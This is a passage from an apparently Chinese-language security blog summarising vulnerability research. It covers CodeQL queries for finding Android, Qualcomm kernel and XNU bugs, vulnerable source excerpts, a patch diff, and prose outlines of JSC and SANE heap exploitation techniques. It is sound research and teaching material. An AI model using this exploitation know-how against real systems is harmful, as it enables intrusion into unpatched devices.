href="#CVE-2017-411-and-CVE-2017-412-Ashmem-race-conditions-in-MemoryIntArray" class="headerlink" title="CVE-2017-411 and CVE-2017-412: Ashmem race conditions in MemoryIntArray"></a>CVE-2017-411 and CVE-2017-412: Ashmem race conditions in MemoryIntArray</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">MemoryIntArray</span><span class="params">(Parcel parcel)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  mOwnerPid = parcel.readInt();</span><br><span class="line">  mClientWritable = (parcel.readInt() == <span class="number">1</span>);</span><br><span class="line">  ParcelFileDescriptor pfd = parcel.readParcelable(<span class="keyword">null</span>);</span><br><span class="line">  <span class="keyword">if</span> (pfd == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"No backing file descriptor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mFd = pfd.detachFd();</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">long</span> memoryAddress = parcel.readLong();</span><br><span class="line">  <span class="keyword">if</span> (isOwner()) &#123;</span><br><span class="line">    mMemoryAddr = memoryAddress;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mMemoryAddr = nativeOpen(mFd, <span class="keyword">false</span>, mClientWritable);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isOwner</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mOwnerPid == Process.myPid();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出如果攻击者可以提供正在攻击这个Process的Pid的话，mMemoryAddr可以被攻击者控制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!isClosed()) &#123;</span><br><span class="line">    nativeClose(mFd, mMemoryAddr, isOwner());</span><br><span class="line">    mFd = -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_util_MemoryIntArray_close</span><span class="params">(JNIEnv* env, jobject clazz, jint fd,</span></span></span><br><span class="line"><span class="function"><span class="params">    jlong ashmemAddr, jboolean owner)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">int</span> unmapResult = munmap(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> *&gt;(ashmemAddr), ashmemSize);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个地址最终被munmap释放。</p><h3 id="What-about-Java-only-gadgets"><a href="#What-about-Java-only-gadgets" class="headerlink" title="What about Java-only gadgets?"></a>What about Java-only gadgets?</h3><p>The code pattern I am looking for here is:</p><ul><li>The Class.forName method is called within a deserialization method.</li><li>The argument of Class.forName can be controlled. At a minimum, this means it should not be a constant.</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class ParcelableDeserializeMethod extends Method &#123;</span><br><span class="line">  ParcelableDeserializeMethod() &#123;</span><br><span class="line">    // Parcelable deserialize method.</span><br><span class="line">    (this.getName() = "createFromParcel" and this.getDeclaringType().getASourceSupertype*().hasName("Creator")) or</span><br><span class="line">    // Serializable readObject</span><br><span class="line">    (this.getName() = "readObject" and this.isPrivate() and</span><br><span class="line">     this.getDeclaringType().getASourceSupertype*().hasQualifiedName("java.io", "Serializable")</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ForName extends Method &#123;</span><br><span class="line">  ForName() &#123;</span><br><span class="line">    this.hasName("forName") and this.isStatic() and</span><br><span class="line">    this.getDeclaringType().getSourceDeclaration().hasQualifiedName("java.lang", "Class")</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MethodAccess ma</span><br><span class="line">// Access to Class.forName</span><br><span class="line">where ma.getMethod() instanceof ForName and</span><br><span class="line">// The class type is not a constant</span><br><span class="line">not ma.getArgument(0) instanceof CompileTimeConstantExpr and</span><br><span class="line">// Called by a deserialization method.</span><br><span class="line">exists(ParcelableDeserializeMethod m | m.polyCalls(ma.getEnclosingCallable()))</span><br><span class="line"><span class="keyword">select</span> ma, ma.getLocation()</span><br></pre></td></tr></table></figure><p>搜索结果有三个，其中两个URL不便控制，最后一个是<code>ParcelableException</code>。</p><h3 id="CVE-2017-0871-Not-so-arbitrary-Java-code-execution"><a href="#CVE-2017-0871-Not-so-arbitrary-Java-code-execution" class="headerlink" title="CVE-2017-0871: Not so arbitrary Java code execution"></a>CVE-2017-0871: Not so arbitrary Java code execution</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--- a/core/java/android/os/ParcelableException.java</span><br><span class="line">+++ b/core/java/android/os/ParcelableException.java</span><br><span class="line">@@ -<span class="number">52</span>,<span class="number">10</span> +<span class="number">52</span>,<span class="number">12</span> @@</span><br><span class="line">         <span class="keyword">final</span> String msg = in.readString();</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">final</span> Class&lt;?&gt; clazz = Class.forName(name, <span class="keyword">true</span>, Parcelable.class.getClassLoader());</span><br><span class="line">-            <span class="keyword">return</span> (Throwable) clazz.getConstructor(String.class).newInstance(msg);</span><br><span class="line">+            <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">+                <span class="keyword">return</span> (Throwable) clazz.getConstructor(String.class).newInstance(msg);</span><br><span class="line">+            &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (ReflectiveOperationException e) &#123;</span><br><span class="line">-            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(name + <span class="string">": "</span> + msg);</span><br><span class="line">         &#125;</span><br><span class="line">+        <span class="keyword">return</span> <span class="keyword">new</span> RuntimeException(name + <span class="string">": "</span> + msg);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h2 id="Stack-buffer-overflow-in-Qualcomm-MSM-4-4"><a href="#Stack-buffer-overflow-in-Qualcomm-MSM-4-4" class="headerlink" title="Stack buffer overflow in Qualcomm MSM 4.4"></a>Stack buffer overflow in Qualcomm MSM 4.4</h2><p><code>copy_from_user</code>时缓冲区溢出。</p><p>CodeQL直接找：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.StackAddress</span><br><span class="line"></span><br><span class="line">from FunctionCall <span class="keyword">call</span>, Expr destArg, Expr sizeArg</span><br><span class="line"><span class="keyword">where</span> call.getTarget().getName() = <span class="string">"copy_from_user"</span></span><br><span class="line"><span class="keyword">and</span> destArg = call.getArgument(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">and</span> sizeArg = call.getArgument(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">and</span> stackPointerFlowsToUse(destArg, _, _, _)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">not</span> sizeArg.isConstant()</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span></span><br></pre></td></tr></table></figure><p>然后会找到类似这种：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[MAX_MSG_LEN];</span><br><span class="line">u32 size = <span class="keyword">sizeof</span>(str) &lt; count ? <span class="keyword">sizeof</span>(str) : count;</span><br><span class="line"><span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">missing = copy_from_user(str, buf, size);</span><br></pre></td></tr></table></figure><p>然后优化一下查询代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.StackAddress</span><br><span class="line">import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line"></span><br><span class="line">from FunctionCall <span class="keyword">call</span>, Expr destArg, Expr sizeArg</span><br><span class="line"><span class="keyword">where</span> call.getTarget().getName() = <span class="string">"copy_from_user"</span></span><br><span class="line"><span class="keyword">and</span> destArg = call.getArgument(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">and</span> sizeArg = call.getArgument(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">and</span> stackPointerFlowsToUse(destArg, _, _, _)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">not</span> sizeArg.isConstant()</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span> (LocalScopeVariable v, <span class="built_in">int</span> destSize</span><br><span class="line">        | destArg = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">          destSize = v.getType().getSize() <span class="keyword">and</span></span><br><span class="line">          <span class="number">0</span> &lt;= lowerBound(sizeArg) <span class="keyword">and</span></span><br><span class="line">          upperBound(sizeArg) &lt;= destSize)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span></span><br></pre></td></tr></table></figure><p>再然后找到这样一个点：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">msm_cpp_copy_from_ioctl_ptr</span><span class="params">(<span class="keyword">void</span> *dst_ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct <span class="keyword">msm_camera_v4l2_ioctl_t</span> *ioctl_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  ret = copy_from_user(dst_ptr,</span><br><span class="line">    (<span class="keyword">void</span> __user *)ioctl_ptr-&gt;ioctl_ptr, ioctl_ptr-&gt;len);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回溯去看它的caller们有没有check，最后发现两个没有check的。</p><h2 id="Castor-and-Hessian-java-deserialization-vulnerabilities"><a href="#Castor-and-Hessian-java-deserialization-vulnerabilities" class="headerlink" title="Castor and Hessian java deserialization vulnerabilities"></a>Castor and Hessian java deserialization vulnerabilities</h2><h3 id="Apache-Camel-vulnerabilities-CVE-2017-12633-and-CVE-2017-12634"><a href="#Apache-Camel-vulnerabilities-CVE-2017-12633-and-CVE-2017-12634" class="headerlink" title="Apache Camel vulnerabilities CVE-2017-12633 and CVE-2017-12634"></a>Apache Camel vulnerabilities CVE-2017-12633 and CVE-2017-12634</h3><h3 id="CodeQL一波搜索"><a href="#CodeQL一波搜索" class="headerlink" title="CodeQL一波搜索"></a>CodeQL一波搜索</h3><p><a href="https://securitylab.github.com/research/hessian-java-deserialization-castor-vulnerabilities" target="_blank" rel="noopener">https://securitylab.github.com/research/hessian-java-deserialization-castor-vulnerabilities</a></p><h2 id="XXE-attack-example-using-jBoss-vulnerability-jBPM-CVE-2017-7545"><a href="#XXE-attack-example-using-jBoss-vulnerability-jBPM-CVE-2017-7545" class="headerlink" title="XXE attack example using jBoss vulnerability (jBPM) CVE-2017-7545"></a>XXE attack example using jBoss vulnerability (jBPM) CVE-2017-7545</h2><p><a href="https://securitylab.github.com/research/xxe-attack-jboss-vulnerability" target="_blank" rel="noopener">https://securitylab.github.com/research/xxe-attack-jboss-vulnerability</a></p><h2 id="Restlet-XXE-vulnerability-CVE-2017-14949"><a href="#Restlet-XXE-vulnerability-CVE-2017-14949" class="headerlink" title="Restlet XXE vulnerability (CVE-2017-14949)"></a>Restlet XXE vulnerability (CVE-2017-14949)</h2><p><a href="https://securitylab.github.com/research/restlet_xxe_vulnerability_CVE-2017-14949" target="_blank" rel="noopener">https://securitylab.github.com/research/restlet_xxe_vulnerability_CVE-2017-14949</a></p><h2 id="Swagger-YAML-Parser-Vulnerability-CVE-2017-1000207-and-CVE-2017-1000208"><a href="#Swagger-YAML-Parser-Vulnerability-CVE-2017-1000207-and-CVE-2017-1000208" class="headerlink" title="Swagger YAML Parser Vulnerability (CVE-2017-1000207 and CVE-2017-1000208)"></a>Swagger YAML Parser Vulnerability (CVE-2017-1000207 and CVE-2017-1000208)</h2><p><a href="https://securitylab.github.com/research/swagger-yaml-parser-vulnerability" target="_blank" rel="noopener">https://securitylab.github.com/research/swagger-yaml-parser-vulnerability</a></p><h2 id="Restlet-XML-External-Entity-Expansion-Vulnerability-CVE-2017-14868"><a href="#Restlet-XML-External-Entity-Expansion-Vulnerability-CVE-2017-14868" class="headerlink" title="Restlet XML External Entity Expansion Vulnerability (CVE-2017-14868)"></a>Restlet XML External Entity Expansion Vulnerability (CVE-2017-14868)</h2><p><a href="https://securitylab.github.com/research/swagger-yaml-parser-vulnerability" target="_blank" rel="noopener">https://securitylab.github.com/research/swagger-yaml-parser-vulnerability</a></p><h2 id="Spring-AMQP-Exploit-CVE-2017-8045-Remote-Code-Execution-Vulnerability"><a href="#Spring-AMQP-Exploit-CVE-2017-8045-Remote-Code-Execution-Vulnerability" class="headerlink" title="Spring AMQP Exploit (CVE-2017-8045): Remote Code Execution Vulnerability"></a>Spring AMQP Exploit (CVE-2017-8045): Remote Code Execution Vulnerability</h2><p><a href="https://securitylab.github.com/research/spring_amqp_exploit_CVE-2017-8045" target="_blank" rel="noopener">https://securitylab.github.com/research/spring_amqp_exploit_CVE-2017-8045</a></p><h2 id="Apple’s-XNU-Kernel-CVE-2017-13782"><a href="#Apple’s-XNU-Kernel-CVE-2017-13782" class="headerlink" title="Apple’s XNU Kernel (CVE-2017-13782)"></a>Apple’s XNU Kernel (CVE-2017-13782)</h2><p>这个是寻找DTrace中的洞，内核中有一个DTrace解释器，用CodeQL查下它有没有直接或间接能被用户控制的指针寄存器啥的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name DTrace unsafe index</span></span><br><span class="line"><span class="comment"> * @description DTrace registers are user-controllable, so they must not be</span></span><br><span class="line"><span class="comment"> *              used to index an array without a bounds check.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id apple-xnu/cpp/dtrace-unsafe-index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class RegisterAccess extends ArrayExpr &#123;</span><br><span class="line">  RegisterAccess() &#123;</span><br><span class="line">    exists (LocalScopeVariable regs, Function emulate</span><br><span class="line">    | regs.getName() = "regs" and</span><br><span class="line">      emulate.getName() = "dtrace_dif_emulate" and</span><br><span class="line">      regs.getFunction() = emulate and</span><br><span class="line">      this.getArrayBase() = regs.getAnAccess())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PointerUse extends Expr &#123;</span><br><span class="line">  PointerUse() &#123;</span><br><span class="line">    exists (ArrayExpr ae | this = ae.getArrayOffset()) or</span><br><span class="line">    exists (PointerDereferenceExpr deref | this = deref.getOperand()) or</span><br><span class="line">    exists (PointerAddExpr add | this = add.getAnOperand())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DTraceUnsafeIndexConfig extends DataFlow::Configuration &#123;</span><br><span class="line">  DTraceUnsafeIndexConfig() &#123;</span><br><span class="line">    this = "DTraceUnsafeIndexConfig"</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node node) &#123;</span><br><span class="line">    node.asExpr() instanceof RegisterAccess</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node node) &#123;</span><br><span class="line">    node.asExpr() instanceof PointerUse</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DTraceUnsafeIndexConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, <span class="keyword">source</span>, sink, <span class="string">"DTrace unsafe index"</span></span><br></pre></td></tr></table></figure><p>结果中15个都是误报，有一个是正确的<code>dtrace_dif_emulate → dtrace_dif_variable → dtrace_getarg</code>；执行<code>dtrace_getarg</code>的时候参数攻击者完成可控，可以任意指针解引用。</p><h2 id="从CVE-2018-4441看jsc的OOB利用"><a href="#从CVE-2018-4441看jsc的OOB利用" class="headerlink" title="从CVE-2018-4441看jsc的OOB利用"></a>从CVE-2018-4441看jsc的OOB利用</h2><p><a href="http://blog.topsec.com.cn/%E4%BB%8Ecve-2018-4441%E7%9C%8Bjsc%E7%9A%84oob%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">原文在这里</a></p><p>文章写挺细，但是漏洞原理没细看，因为没有读过jsc源码，甚至都没翻过；利用的话还是addr+fakeobj+wasm那一套。</p><h2 id="JS-Engine-Exploit-qwn2own"><a href="#JS-Engine-Exploit-qwn2own" class="headerlink" title="JS Engine Exploit-qwn2own"></a>JS Engine Exploit-qwn2own</h2><p>关键是找到漏洞点，就是remove可以传-1，一下就造成了oob，然后利用：</p><ul><li>传统方法过ASLR；</li><li>本题适用JIT的RWX内存，但是现在JIT的内存页好像已经不是RWX了；</li></ul><h2 id="Last-orders-at-the-House-of-Force"><a href="#Last-orders-at-the-House-of-Force" class="headerlink" title="Last orders at the House of Force"></a>Last orders at the House of Force</h2><p>“Last orders at the House of Force”谷歌翻译告诉我是“上议院最后的命令”。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><a href="http://www.sane-project.org/" target="_blank" rel="noopener">SANE - Scanner Access Now Easy</a>，</p><p><a href="https://packages.ubuntu.com/bionic/simple-scan" target="_blank" rel="noopener">simple-scan</a></p><p>simple-scan好像是个扫描应用，SANE是它使用的开源库。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>信息泄露用的是<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12862" target="_blank" rel="noopener">CVE-2020-12862</a>（又名GHSL-2020-082），有以下越界读取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* h000 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">decode_binary</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> tmp[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">int</span> hl;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(tmp, buf, <span class="number">4</span>);</span><br><span class="line">  tmp[<span class="number">4</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="string">'h'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  hl = strtol(tmp + <span class="number">1</span>, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> (hl) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *v = <span class="built_in">malloc</span>(hl + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(v, buf + <span class="number">4</span>, hl);</span><br><span class="line">    v[hl] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf是可控的，所以hl也是可控的；整个漏洞利用取决于是否能覆盖高地址的栈，信息泄露出的指针，总是比我们要覆盖的指针高0x218；To compute the subtraction，我们使用House of Force的变体。</p><h3 id="复习一下House-of-系列"><a href="#复习一下House-of-系列" class="headerlink" title="复习一下House of 系列"></a>复习一下House of 系列</h3><h4 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h4><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>可以任意地址写。</p><h4 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h4><p>修改small bin的最后一个chunk的bk为我们指定内存地址的fake chunk，并且同时满足之后的bck-&gt;fd != victim的检测，那么我们就可以使得small bin的bk恰好为我们构造的fake chunk。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>起一个服务监听UDP端口3289，然后After the initial UDP exchange, the protocol switches to TCP communication, which is where the bugs are. The TCP communication is handled by a pair of functions: epsonds_net_write and epsonds_net_read. First, epsonds_net_write sends a short message containing a command and an expected reply size. It also allocates a heap buffer for the reply. Then epsonds_net_read receives the reply:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* receive net header */</span></span><br><span class="line">size = epsonds_net_read_raw(s, header, <span class="number">12</span>, status);</span><br><span class="line"><span class="keyword">if</span> (size != <span class="number">12</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (header[<span class="number">0</span>] != <span class="string">'I'</span> || header[<span class="number">1</span>] != <span class="string">'S'</span>) &#123;</span><br><span class="line">  DBG(<span class="number">1</span>, <span class="string">"header mismatch: %02X %02x\n"</span>, header[<span class="number">0</span>], header[<span class="number">1</span>]);</span><br><span class="line">  *status = SANE_STATUS_IO_ERROR;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incoming payload size</span></span><br><span class="line">size = be32atoh(&amp;header[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">DBG(<span class="number">23</span>, <span class="string">"%s: wanted = %lu, available = %lu\n"</span>, __func__,</span><br><span class="line">  (u_long) wanted, (u_long) size);</span><br><span class="line"></span><br><span class="line">*status = SANE_STATUS_GOOD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == wanted) &#123;</span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">15</span>, <span class="string">"%s: full read\n"</span>, __func__);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size) &#123;</span><br><span class="line">    read = epsonds_net_read_raw(s, buf, size, status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s-&gt;netbuf) &#123;</span><br><span class="line">    <span class="built_in">free</span>(s-&gt;netbuf);</span><br><span class="line">    s-&gt;netbuf = <span class="literal">NULL</span>;</span><br><span class="line">    s-&gt;netlen = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (wanted &lt; size) &#123;</span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">23</span>, <span class="string">"%s: long tail\n"</span>, __func__);</span><br><span class="line"></span><br><span class="line">  read = epsonds_net_read_raw(s, s-&gt;netbuf, size, status);  &lt;===== no bounds check</span><br><span class="line">  <span class="keyword">if</span> (read != size) &#123;</span><br><span 